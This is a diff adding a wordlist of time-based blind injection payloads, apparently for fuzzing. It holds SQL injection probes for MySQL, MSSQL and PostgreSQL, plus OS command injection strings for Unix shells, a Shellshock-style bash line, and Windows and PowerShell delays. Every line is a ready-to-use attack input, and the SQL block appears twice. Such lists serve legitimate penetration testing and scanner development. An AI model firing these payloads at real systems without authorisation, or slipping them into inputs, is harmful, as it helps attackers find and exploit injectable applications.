@@ -1,0 +1,87 @@
+sleep(4)#
+1 or sleep(4)#
+" or sleep(4)#
+' or sleep(4)#
+" or sleep(4)="
+' or sleep(4)='
+1) or sleep(4)#
+") or sleep(4)="
+') or sleep(4)='
+1)) or sleep(4)#
+")) or sleep(4)="
+')) or sleep(4)='
+;waitfor delay '0:0:4'--
+);waitfor delay '0:0:4'--
+';waitfor delay '0:0:4'--
+";waitfor delay '0:0:4'--
+');waitfor delay '0:0:4'--
+");waitfor delay '0:0:4'--
+));waitfor delay '0:0:4'--
+'));waitfor delay '0:0:4'--
+"));waitfor delay '0:0:4'--
+;sleep 4;
+|sleep 4#
+|/usr/bin/sleep 4#
+|sleep 4;
+& sleep 4;
+;sleep 4|
+`sleep 4`
+`/usr/bin/sleep 4`
+`sleep 4`
+() { :;}; /bin/bash -c "sleep 4"
+|C:\Windows\System32\timeout.exe 4
+|timeout 4|
+|C:\Windows\System32\timeout.exe 4|
+|timeout 4;
+;system('timeout 4')
+;system('C:\Windows\System32\timeout.exe 4')
+&& FOR /F "delims=" %i IN ('timeout 4') DO echo 1
+;Start-Sleep -s 4;
+;Start-Sleep -s 4#
+|Start-Sleep -s 4|
+|Start-Sleep -s 4;
+;Start-Sleep -s 4|
+;system('Start-Sleep -s 4')
+%0AStart-Sleep -s 4%0A
+%0a Start-Sleep -s 4 %0a
+sleep(4)#
+1 or sleep(4)#
+" or sleep(4)#
+' or sleep(4)#
+" or sleep(4)="
+' or sleep(4)='
+1) or sleep(4)#
+") or sleep(4)="
+') or sleep(4)='
+1)) or sleep(4)#
+")) or sleep(4)="
+')) or sleep(4)='
+;waitfor delay '0:0:4'--
+);waitfor delay '0:0:4'--
+';waitfor delay '0:0:4'--
+";waitfor delay '0:0:4'--
+');waitfor delay '0:0:4'--
+");waitfor delay '0:0:4'--
+));waitfor delay '0:0:4'--
+'));waitfor delay '0:0:4'--
+"));waitfor delay '0:0:4'--
+pg_sleep(4)--
+1 or pg_sleep(4)--
+" or pg_sleep(4)--
+' or pg_sleep(4)--
+1) or pg_sleep(4)--
+") or pg_sleep(4)--
+') or pg_sleep(4)--
+1)) or pg_sleep(4)--
+")) or pg_sleep(4)--
+')) or pg_sleep(4)--
+AND (SELECT * FROM (SELECT(SLEEP(4)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(4)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(4)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(4)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(4)))nQIP)#
+SLEEP(4)#
+SLEEP(4)--
+SLEEP(4)="
+SLEEP(4)='
+SLEEP(4)/*' or SLEEP(4) or '" or SLEEP(4) or "*/
